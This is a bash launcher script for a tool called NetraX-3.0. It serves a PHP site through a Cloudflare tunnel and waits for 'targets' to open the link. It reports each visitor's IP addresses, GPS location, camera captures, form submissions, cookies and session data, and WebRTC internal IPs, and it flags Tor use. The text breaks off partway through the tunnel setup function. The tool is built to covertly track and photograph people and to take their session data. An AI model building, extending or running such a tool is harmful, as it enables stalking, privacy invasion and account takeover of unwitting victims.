#!/bin/bash
# --------------------------------------------------
# NetraX-3.0
# Created, Developed & Maintained by Raj Kumar
# GitHub: https://github.com/Garuda-Netra
# --------------------------------------------------

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  # We're on Windows
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  # Define Windows-specific command replacements
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

banner() {
clear
printf "\n"

# ─── Top Ornamental Border ───────────────────────────────────────────
printf "\e[1;96m    ════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\e[1;91m                     ⚔️ नेत्र-X ver-3.0 ⚡  Digital Recon ⚔️\e[0m\n"
printf "\e[1;96m    ════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"

# ─── ASCII Art Logo Box ──────────────────────────────────────────────
printf "\e[1;96m    ╔══════════════════════════════════════════════════════════════════╗\e[0m\n"
printf "\e[1;96m    ║                                                                  ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m███╗   ██╗\e[0m\e[1;37m ███████╗\e[0m\e[1;92m ████████╗\e[0m\e[1;37m ██████╗ \e[0m\e[1;92m  █████╗\e[0m\e[1;93m        \e[0m\e[1;91m ██╗    ██╗\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m████╗  ██║\e[0m\e[1;37m ██╔════╝\e[0m\e[1;92m ╚══██╔══╝\e[0m\e[1;37m ██╔══██╗\e[0m\e[1;92m ██╔══██╗\e[0m\e[1;93m        \e[0m\e[1;91m ╚██╗██╔╝\e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██╔██╗ ██║\e[0m\e[1;37m █████╗  \e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██████╔╝\e[0m\e[1;92m ███████║\e[0m\e[1;93m ██████ \e[0m\e[1;91m  ╚███╔╝ \e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██║╚██╗██║\e[0m\e[1;37m ██╔══╝  \e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██╔══██╗\e[0m\e[1;92m ██╔══██║\e[0m\e[1;93m        \e[0m\e[1;91m  ██╔██╗ \e[0m\e[1;96m ║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m██║ ╚████║\e[0m\e[1;37m ███████╗\e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██║  ██║\e[0m\e[1;92m ██║  ██║\e[0m\e[1;93m       \e[0m\e[1;91m ██╔╝   ██╗\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║ \e[1;92m╚═╝  ╚═══╝\e[0m\e[1;37m ╚══════╝\e[0m\e[1;92m    ╚═╝   \e[0m\e[1;37m ╚═╝  ╚═╝\e[0m\e[1;92m ╚═╝  ╚═╝\e[0m\e[1;93m       \e[0m\e[1;91m ╚═╝    ╚═╝\e[0m\e[1;96m║\e[0m\n"
printf "\e[1;96m    ║                                                                  ║\e[0m\n"
printf "\e[1;96m    ╚══════════════════════════════════════════════════════════════════╝\e[0m\n"

# ─── Tagline Bar ─────────────────────────────────────────────────────
printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\e[1;96m            ⚡ 👁️  NETRA-X ver-3.0  ━  The All-Seeing Eye  👁️ ⚡\e[0m\n"
printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"

# ─── Mahabharata Vision Section ──────────────────────────────────────
printf "\n"
printf "\e[1;91m    ◆━━━━━━━━━━━━━━ ⚡ Divya Drishti (Divine Vision) ⚡ ━━━━━━━━━━━━━━◆\e[0m\n"
printf "\n"

# ── Shloka 1 : The Gift of Divine Eyes --Bhagavad Gita 11.8 (Mahabharata) ──
printf "\e[1;93m     न तु मां शक्यसे द्रष्टुमनेनैव स्वचक्षुषा ।\e[0m\n"
printf "\e[1;93m     दिव्यं ददामि ते चक्षुः पश्य मे योगमैश्वरम् ॥\e[0m\n"
printf "\e[1;37m     \"But you cannot see Me with your present eyes.\e[0m\n"
printf "\e[1;37m      Therefore I give you divine eyes (Netra).\e[0m\n"
printf "\e[1;37m      Behold My mystic opulence!\"\e[0m\n"
printf "\e[0;90m                                  --Bhagavad Gita 11.8 (Mahabharata)\e[0m\n"
printf "\n"

# ── Shloka 2 : The Cosmic Promise --Bhagavad Gita 4.7 (Mahabharata) ────────
printf "\e[1;93m     यदा यदा हि धर्मस्य ग्लानिर्भवति भारत ।\e[0m\n"
printf "\e[1;93m     अभ्युत्थानमधर्मस्य तदात्मानं सृजाम्यहम् ॥\e[0m\n"
printf "\e[1;37m     \"Whenever and wherever there is a decline in righteousness,\e[0m\n"
printf "\e[1;37m      and a predominant rise of unrighteousness,\e[0m\n"
printf "\e[1;37m      at that time I descend Myself.\"\e[0m\n"
printf "\e[0;90m                                  --Bhagavad Gita 4.7 (Mahabharata)\e[0m\n"
printf "\n"

# ── Shloka 3 : The Ultimate Victory --Bhagavad Gita 18.78 (Mahabharata) ────
printf "\e[1;93m     यत्र योगेश्वरः कृष्णो यत्र पार्थो धनुर्धरः ।\e[0m\n"
printf "\e[1;93m     तत्र श्रीर्विजयो भूतिर्ध्रुवा नीतिर्मतिर्मम ॥\e[0m\n"
printf "\e[1;37m     \"Wherever there is the master of all mystics,\e[0m\n"
printf "\e[1;37m      and the supreme archer, there will be certain\e[0m\n"
printf "\e[1;37m      victory, extraordinary power, and morality.\"\e[0m\n"
printf "\e[0;90m                                  --Bhagavad Gita 18.78 (Mahabharata)\e[0m\n"
printf "\n"

printf "\e[1;91m    ◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\e[0m\n"

# ─── Professional Footer ─────────────────────────────────────────────
printf "\n"
printf "\e[1;96m     🛡️  Project  :\e[0m \e[1;97mNETRA-X ver-3.0\e[0m\n"
printf "\e[1;96m     🔗  GitHub   :\e[0m \e[1;92mgithub.com/Garuda-Netra\e[0m\n"
printf "\e[1;96m     ⚔️  Creator  :\e[0m \e[1;97mRaj Kumar\e[0m\n"
printf "\n"
printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
}

install_php_package() {
  local installed=false
  printf "\e[1;93m[\e[0m!\e[1;93m] PHP binary not found --attempting auto-install...\e[0m\n"

  if command -v apt-get > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected apt (Debian/Ubuntu). Installing php...\e[0m\n"
    sudo apt-get update -qq > /dev/null 2>&1 && sudo apt-get install -y -qq php-cli php-common > /dev/null 2>&1 && installed=true
  elif command -v dnf > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected dnf (Fedora/RHEL). Installing php...\e[0m\n"
    sudo dnf install -y -q php-cli > /dev/null 2>&1 && installed=true
  elif command -v yum > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected yum (CentOS/RHEL). Installing php...\e[0m\n"
    sudo yum install -y -q php-cli > /dev/null 2>&1 && installed=true
  elif command -v pacman > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected pacman (Arch). Installing php...\e[0m\n"
    sudo pacman -Sy --noconfirm php > /dev/null 2>&1 && installed=true
  elif command -v apk > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected apk (Alpine). Installing php...\e[0m\n"
    sudo apk add --no-cache php-cli > /dev/null 2>&1 && installed=true
  elif command -v zypper > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected zypper (openSUSE). Installing php...\e[0m\n"
    sudo zypper install -y php-cli > /dev/null 2>&1 && installed=true
  elif command -v brew > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected Homebrew (macOS). Installing php...\e[0m\n"
    brew install php > /dev/null 2>&1 && installed=true
  elif command -v pkg > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected pkg (Termux). Installing php...\e[0m\n"
    pkg install -y php > /dev/null 2>&1 && installed=true
  elif command -v choco > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected Chocolatey (Windows). Installing php...\e[0m\n"
    choco install php -y > /dev/null 2>&1 && installed=true
  elif command -v winget > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected winget (Windows). Installing php...\e[0m\n"
    winget install --id PHP.PHP --accept-source-agreements --accept-package-agreements > /dev/null 2>&1 && installed=true
  fi

  if command -v php > /dev/null 2>&1; then
    printf "\e[1;92m[\e[0m+\e[1;92m] PHP installed successfully!\e[0m\n"
  else
    printf "\e[1;91m[!] Could not auto-install PHP binary. Please install PHP manually. Aborting.\e[0m\n"
    exit 1
  fi
}

install_php_extension() {
  local ext="$1"
  if php -m 2>/dev/null | grep -qi "^${ext}$"; then
    printf "\e[1;92m[\e[0m+\e[1;92m] php-${ext} extension found.\e[0m\n"
    return 0
  fi

  printf "\e[1;93m[\e[0m!\e[1;93m] php-${ext} extension not found --attempting auto-install...\e[0m\n"

  local php_ver=""
  php_ver=$(php -r 'echo PHP_MAJOR_VERSION . "." . PHP_MINOR_VERSION;' 2>/dev/null)
  local installed=false

  if command -v apt-get > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected apt (Debian/Ubuntu). Installing php-${ext}...\e[0m\n"
    if sudo apt-get update -qq > /dev/null 2>&1 && \
       sudo apt-get install -y -qq "php${php_ver}-${ext}" > /dev/null 2>&1; then
      installed=true
    elif sudo apt-get install -y -qq "php-${ext}" > /dev/null 2>&1; then
      installed=true
    fi
  elif command -v dnf > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected dnf (Fedora/RHEL). Installing php-${ext}...\e[0m\n"
    sudo dnf install -y -q "php-${ext}" > /dev/null 2>&1 && installed=true
  elif command -v yum > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected yum (CentOS/RHEL). Installing php-${ext}...\e[0m\n"
    sudo yum install -y -q "php-${ext}" > /dev/null 2>&1 && installed=true
  elif command -v pacman > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected pacman (Arch). Installing php-${ext}...\e[0m\n"
    sudo pacman -Sy --noconfirm "php-${ext}" > /dev/null 2>&1 && installed=true
  elif command -v apk > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected apk (Alpine). Installing php-${ext}...\e[0m\n"
    if sudo apk add --no-cache "php${php_ver%%.*}-${ext}" > /dev/null 2>&1 || \
       sudo apk add --no-cache "php-${ext}" > /dev/null 2>&1; then
      installed=true
    fi
  elif command -v zypper > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected zypper (openSUSE). Installing php-${ext}...\e[0m\n"
    sudo zypper install -y "php-${ext}" > /dev/null 2>&1 && installed=true
  elif command -v brew > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected Homebrew (macOS). Installing/updating php...\e[0m\n"
    brew install php > /dev/null 2>&1 && installed=true
  elif command -v pkg > /dev/null 2>&1; then
    printf "\e[1;96m[*] Detected pkg (Termux). Installing php...\e[0m\n"
    pkg install -y php > /dev/null 2>&1 && installed=true
  fi

  if php -m 2>/dev/null | grep -qi "^${ext}$"; then
    printf "\e[1;92m[\e[0m+\e[1;92m] php-${ext} extension installed successfully!\e[0m\n"
  else
    printf "\e[1;93m[\e[0m!\e[1;93m] Could not auto-install php-${ext}.\e[0m\n"
    if [[ "$ext" == "curl" ]]; then
      printf "\e[1;93m[*] Discord webhook will use file_get_contents() fallback.\e[0m\n"
    fi
    printf "\e[1;93m[*] You can install it manually via your package manager:\e[0m\n"
    printf "\e[1;97m      sudo apt install php${php_ver}-${ext}   (Debian/Ubuntu)\e[0m\n"
    printf "\e[1;97m      sudo dnf install php-${ext}            (Fedora/RHEL)\e[0m\n"
    printf "\e[1;97m      sudo pacman -S php-${ext}              (Arch)\e[0m\n"
  fi
}

dependencies() {
  # ── 1. Check & auto-install PHP binary ────────────────────────────────
  if ! command -v php > /dev/null 2>&1; then
    install_php_package
  fi

  # ── 2. Check & auto-install required PHP extensions ────────────────────
  for ext in curl json mbstring openssl; do
    install_php_extension "$ext"
  done
}

stop() {
if [[ "$windows_mode" == true ]]; then
  # Windows-specific process termination
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  # Unix-like systems
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

exit 1
}

catch_ip() {
  if [[ -e "data/ip_logs.txt" ]]; then
    last_entry=$(tail -n 1 "data/ip_logs.txt")
    ipv4=$(echo "$last_entry" | grep -oP 'IPv4:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    ipv6=$(echo "$last_entry" | grep -oP 'IPv6:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    browser=$(echo "$last_entry" | grep -oP 'Browser:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    os=$(echo "$last_entry" | grep -oP 'OS:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    device=$(echo "$last_entry" | grep -oP 'Device:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    tor=$(echo "$last_entry" | grep -oP 'Tor:\s*\K[^|]+' | sed 's/^[ \t]*//;s/[ \t]*$//')
    ua=$(echo "$last_entry" | grep -oP 'User-Agent:\s*\K.*' | sed 's/^[ \t]*//;s/[ \t]*$//')

    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IPv4:\e[0m\e[1;77m %s\e[0m\n" "${ipv4:-Not detected}"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" "${ipv6:-Not detected}"
    if [[ -n "$browser" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Browser:\e[0m\e[1;77m %s\e[0m\n" "$browser"
    fi
    if [[ -n "$os" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] OS:\e[0m\e[1;77m %s\e[0m\n" "$os"
    fi
    if [[ -n "$device" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" "$device"
    fi
    if [[ "$tor" == "YES" ]]; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Tor Network:\e[0m\e[1;91m YES -- Anonymized Tor Exit Node\e[0m\n"
    fi
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
    echo "$last_entry" >> data/saved_ip.txt
  else
    printf "\e[1;91m[!] ip_logs.txt not found.\e[0m\n"
  fi
}

catch_location() {
  local location_file="$1"
  # Fallback: find newest individual location file if path not provided
  if [[ -z "$location_file" || ! -f "$location_file" ]]; then
    location_file=$(ls -t data/location_[0-9]*.txt data/location_ip_[0-9]*.txt 2>/dev/null | head -n 1)
  fi
  if [[ -n "$location_file" && -f "$location_file" ]]; then
    local source=$(grep 'Source:' "$location_file" | awk '{print $2}')
    local lat=$(grep 'Latitude:' "$location_file" | awk '{print $2}')
    local lon=$(grep 'Longitude:' "$location_file" | awk '{print $2}')
    local acc=$(grep 'Accuracy:' "$location_file" | awk '{$1=""; print substr($0,2)}')
    local maps_link=$(grep 'Google Maps:' "$location_file" | awk '{print $3}')

    # Display source type
    if [[ "$source" == "ip_geolocation" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Source:\e[0m\e[1;33m IP-Based (GPS denied) \e[0m\n"
    elif [[ -n "$source" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Source:\e[0m\e[1;77m %s\e[0m\n" "$source"
    fi

    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Latitude:\e[0m\e[1;77m %s\e[0m\n" "$lat"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Longitude:\e[0m\e[1;77m %s\e[0m\n" "$lon"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Accuracy:\e[0m\e[1;77m %s\e[0m\n" "$acc"
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Google Maps:\e[0m\e[1;77m %s\e[0m\n" "$maps_link"

    # Show IP-geolocation extra fields if present
    local ip_addr=$(grep '^IP:' "$location_file" | awk '{print $2}')
    local city=$(grep '^City:' "$location_file" | awk '{$1=""; print substr($0,2)}')
    local region=$(grep '^Region:' "$location_file" | awk '{$1=""; print substr($0,2)}')
    local country=$(grep '^Country:' "$location_file" | awk '{$1=""; print substr($0,2)}')
    local isp=$(grep '^ISP:' "$location_file" | awk '{$1=""; print substr($0,2)}')

    if [[ -n "$ip_addr" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip_addr"
    fi
    if [[ -n "$city" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" "$city"
    fi
    if [[ -n "$region" && -n "$country" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s, %s\e[0m\n" "$region" "$country"
    fi
    if [[ -n "$isp" ]]; then
      printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$isp"
    fi

    # Archive inside /data/saved_locations/
    if [[ ! -d "data/saved_locations" ]]; then
      mkdir -p data/saved_locations
    fi
    mv "$location_file" "data/saved_locations/" 2>/dev/null
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved: data/saved_locations/%s\e[0m\n" "$(basename $location_file)"
  else
    printf "\e[1;91m[!] No location file found in data/.\e[0m\n"
  fi
}

checkfound() {
# Ensure directories exist
if [[ ! -d "data" ]]; then
  mkdir -p data
fi
if [[ ! -d "data/saved_locations" ]]; then
  mkdir -p data/saved_locations
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
while true; do

  # ── New IP hit ──
  if [[ -e "data/.flag_ip" ]]; then
    rm -f "data/.flag_ip"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
    catch_ip
  fi

  sleep 0.5

  # ── Geolocation error from browser ──
  if [[ -e "data/.flag_location_error" ]]; then
    loc_error=$(cat "data/.flag_location_error" 2>/dev/null)
    rm -f "data/.flag_location_error"
    printf "\n\e[1;91m[!] Geolocation failed: %s\e[0m\n" "$loc_error"
  fi

  # ── New location ──
  if [[ -e "data/.flag_location" ]]; then
    loc_basename=$(cat "data/.flag_location" 2>/dev/null)
    rm -f "data/.flag_location"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
    catch_location "data/${loc_basename}"
  fi

  # ── New camera capture ──
  if [[ -e "data/.flag_cam" ]]; then
    cam_path=$(cat "data/.flag_cam" 2>/dev/null)
    rm -f "data/.flag_cam"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera capture received!\e[0m\n"
    if [[ -n "$cam_path" ]]; then
      printf "\e[1;93m[\e[0m+\e[1;93m] Saved: %s\e[0m\n" "$cam_path"
    fi
  fi

  # ── New form submission ──
  if [[ -e "data/.flag_form" ]]; then
    form_data=$(cat "data/.flag_form" 2>/dev/null)
    rm -f "data/.flag_form"
    printf "\n\e[1;92m[\e[0m+\e[1;92m] Form submission received!\e[0m\n"
    printf "\e[1;93m%s\e[0m\n" "$form_data"
  fi

  # ── New visitor detection (userInfo.php) ──
  if [[ -e "data/.flag_visitor" ]]; then
    visitor_data=$(cat "data/.flag_visitor" 2>/dev/null)
    rm -f "data/.flag_visitor"
    printf "\n\e[1;96m%s\e[0m\n" "$visitor_data"
  fi

  # ── Tor exit node alert ──
  if [[ -e "data/.flag_tor" ]]; then
    tor_data=$(cat "data/.flag_tor" 2>/dev/null)
    rm -f "data/.flag_tor"
    printf "\n\e[1;91m[!] TOR BROWSER DETECTED --connection is anonymized!\e[0m\n"
    printf "\e[1;91m[!] WebRTC leaks are BLOCKED by Tor Browser.\e[0m\n"
    printf "\e[1;91m[!] Real IP cannot be retrieved via WebRTC on this visit.\e[0m\n"
    printf "\e[1;93m%s\e[0m\n" "$tor_data"
  fi

  # ── WebRTC internal IP / VPN detection ──
  if [[ -e "data/.flag_webrtc" ]]; then
    webrtc_data=$(cat "data/.flag_webrtc" 2>/dev/null)
    rm -f "data/.flag_webrtc"
    printf "\n\e[1;95m[\e[0m+\e[1;95m] WebRTC Internal IP captured!\e[0m\n"
    printf "\e[1;93m%s\e[0m\n" "$webrtc_data"
    printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/webrtc_ips.txt  |  data/webrtc_ips.jsonl\e[0m\n"
  fi

  # ── New cookie / session / device telemetry capture ──
  if [[ -e "data/.flag_cookies" ]]; then
    cookie_data=$(cat "data/.flag_cookies" 2>/dev/null)
    rm -f "data/.flag_cookies"
    printf "\n\e[1;93m[\e[0m+\e[1;93m] ⚡ Device Telemetry & Session Data Captured!\e[0m\n"
    printf "\e[1;96m%s\e[0m\n" "$cookie_data"
    printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/cookies_sessions.txt  |  data/cookies_sessions.jsonl\e[0m\n"
  fi

  sleep 0.5

done
}

# --------------------------------------------------
# install_cloudflared
# Downloads the correct cloudflared binary for this
# OS/arch into the project directory.  Does NOT touch
# any system paths, package managers, or global config.
# Returns: 0 on success, 1 on failure (non-fatal --
#          caller decides whether to abort or advise).
# --------------------------------------------------
install_cloudflared() {
  # Prefer wget; fall back to curl when wget is absent
  local downloader=""
  if command -v wget > /dev/null 2>&1; then
    downloader="wget"
  elif command -v curl > /dev/null 2>&1; then
    downloader="curl"
  else
    printf "\e[1;91m[!] Neither wget nor curl is available. Cannot auto-install cloudflared.\e[0m\n"
    return 1
  fi

  local arch os base_url="https://github.com/cloudflare/cloudflared/releases/latest/download"
  arch=$(uname -m 2>/dev/null || echo "unknown")
  os=$(uname -s 2>/dev/null || echo "unknown")

  printf "\e[1;92m[\e[0m+\e[1;92m] Detected OS: %s, Architecture: %s\e[0m\n" "$os" "$arch"
  printf "\e[1;92m[\e[0m+\e[1;92m] Downloading cloudflared into project directory...\e[0m\n"

  local download_url="" dest=""

  if [[ "$windows_mode" == true ]]; then
    # ── Windows (WSL / Git-Bash / MSYS) ─────────────────────────────────
    printf "\e[1;92m[\e[0m+\e[1;92m] Windows detected, downloading Windows binary...\e[0m\n"
    download_url="${base_url}/cloudflared-windows-amd64.exe"
    dest="cloudflared.exe"

  elif [[ "$os" == "Darwin" ]]; then
    # ── macOS ─────────────────────────────────────────────────────────────
    printf "\e[1;92m[\e[0m+\e[1;92m] macOS detected...\e[0m\n"
    if [[ "$arch" == "arm64" ]]; then
      printf "\e[1;92m[\e[0m+\e[1;92m] Apple Silicon (M1/M2/M3) detected...\e[0m\n"
      download_url="${base_url}/cloudflared-darwin-arm64.tgz"
    else
      printf "\e[1;92m[\e[0m+\e[1;92m] Intel Mac detected...\e[0m\n"
      download_url="${base_url}/cloudflared-darwin-amd64.tgz"
    fi
    dest="cloudflared.tgz"

  else
    # ── Linux / Termux / other Unix-like ──────────────────────────────────
    case "$arch" in
      "x86_64")
        printf "\e[1;92m[\e[0m+\e[1;92m] x86_64 architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-amd64"
        ;;
      "i686"|"i386")
        printf "\e[1;92m[\e[0m+\e[1;92m] x86 32-bit architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-386"
        ;;
      "aarch64"|"arm64")
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM64 architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-arm64"
        ;;
      "armv7l"|"armv6l"|"arm")
        printf "\e[1;92m[\e[0m+\e[1;92m] ARM architecture detected...\e[0m\n"
        download_url="${base_url}/cloudflared-linux-arm"
        ;;
      *)
        printf "\e[1;93m[!] Unknown architecture (%s). Defaulting to linux-amd64...\e[0m\n" "$arch"
        download_url="${base_url}/cloudflared-linux-amd64"
        ;;
    esac
    dest="cloudflared"
  fi

  # ── Perform the download ─────────────────────────────────────────────────
  if [[ "$downloader" == "wget" ]]; then
    wget --no-check-certificate "$download_url" -O "$dest" > /dev/null 2>&1
  else
    curl -fsSL "$download_url" -o "$dest" 2>/dev/null
  fi

  # Verify the download produced a non-empty file
  if [[ ! -s "$dest" ]]; then
    printf "\e[1;91m[!] Download failed or the file is empty. Check your internet connection.\e[0m\n"
    rm -f "$dest"
    return 1
  fi

  # ── macOS: extract the .tgz archive ─────────────────────────────────────
  if [[ "$os" == "Darwin" && "$dest" == "cloudflared.tgz" ]]; then
    tar -xzf cloudflared.tgz > /dev/null 2>&1
    rm -f cloudflared.tgz
    if [[ ! -e "cloudflared" ]]; then
      printf "\e[1;91m[!] Extraction failed. The archive may be corrupt.\e[0m\n"
      return 1
    fi
  fi

  # ── Make executable ──────────────────────────────────────────────────────
  if [[ "$windows_mode" == true ]]; then
    chmod +x cloudflared.exe 2>/dev/null
    # Create a thin POSIX wrapper so the rest of the script always calls ./cloudflared
    printf '#!/bin/bash\n./cloudflared.exe "$@"\n' > cloudflared
    chmod +x cloudflared
  else
    chmod +x cloudflared
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] cloudflared installed successfully into the project directory.\e[0m\n"
  return 0
}

# --------------------------------------------------
# cloudflare_tunnel
# Resolves the cloudflared binary (local → PATH →
# auto-install), validates it, then starts a PHP
# server + Cloudflare Quick Tunnel and waits for the
# public URL.
# --------------------------------------------------
cloudflare_tunnel() {
  # ── Step 0: Kill stale processes from previous runs ─────────────────────
  # Port 3333 or cloudflared may still be occupied from an earlier session.
  # This is the #1 cause of Error 1016: the PHP server silently fails to
  # bind because the port is taken, leaving cloudflared with no origin.
  printf "\e[1;92m[\e[0m+\e[1;92m] Cleaning up stale processes...\e[0m\n"
  if [[ "$windows_mode" == true ]]; then
    taskkill /F /IM "cloudflared.exe" 2>/dev/null
    # Kill only PHP processes on port 3333 (best-effort on Windows)
    for pid in $(netstat -ano 2>/dev/null | grep ':3333 ' | grep 'LISTENING' | awk '{print $NF}' | sort -u); do
      taskkill /F /PID "$pid" 2>/dev/null
    done
  else
    # Kill any existing cloudflared tunnel processes
    pkill -f "cloudflared.*tunnel" 2>/dev/null
    killall cloudflared 2>/dev/null
    # Kill PHP processes bound to port 3333
    if command -v fuser > /dev/null 2>&1; then
      fuser -k 3333/tcp 2>/dev/null
    elif command -v lsof > /dev/null 2>&1; then
      lsof -ti:3333 2>/dev/null | xargs kill -9 2>/dev/null
    else
      pkill -f "php.*3333" 2>/dev/null
    fi
  fi
  sleep 1   # Let OS release the port

  # ── Step 1: Resolve cloudflared binary ──────────────────────────────────
  # Priority: (a) local project binary → (b) system PATH → (c) auto-install
  local cf_bin=""

  # (a) Local binary inside the project directory
  if [[ "$windows_mode" == true ]] && [[ -e "./cloudflared.exe" ]]; then
    cf_bin="./cloudflared.exe"
  elif [[ -e "./cloudflared" ]]; then
    cf_bin="./cloudflared"
  fi

  # (b) System-wide installation on PATH (does not override local copy)
  if [[ -z "$cf_bin" ]] && command -v cloudflared > /dev/null 2>&1; then
    cf_bin="cloudflared"
    printf "\e[1;92m[\e[0m+\e[1;92m] Found cloudflared in system PATH: %s\e[0m\n" "$(command -v cloudflared)"
  fi

  # (c) Not found anywhere --attempt isolated install into project directory
  if [[ -z "$cf_bin" ]]; then
    printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared not found locally or in PATH.\e[0m\n"
    printf "\e[1;93m[\e[0m!\e[1;93m] Attempting automatic installation (project directory only)...\e[0m\n"

    if ! install_cloudflared; then
      printf "\e[1;91m[!] Automatic installation failed. Cannot start CloudFlare tunnel.\e[0m\n"
      printf "\e[1;93m[*] Install cloudflared manually, then re-run the script:\e[0m\n"
      printf "\e[1;93m      1. Download from: https://github.com/cloudflare/cloudflared/releases\e[0m\n"
      printf "\e[1;93m      2. Place the binary in this project directory\e[0m\n"
      printf "\e[1;93m      3. Run:     chmod +x cloudflared\e[0m\n"
      printf "\e[1;93m      4. Re-run:  bash netraX-3.0.sh\e[0m\n"
      exit 1
    fi

    # Re-resolve after successful installation
    if [[ "$windows_mode" == true ]] && [[ -e "./cloudflared.exe" ]]; then
      cf_bin="./cloudflared.exe"
    elif [[ -e "./cloudflared" ]]; then
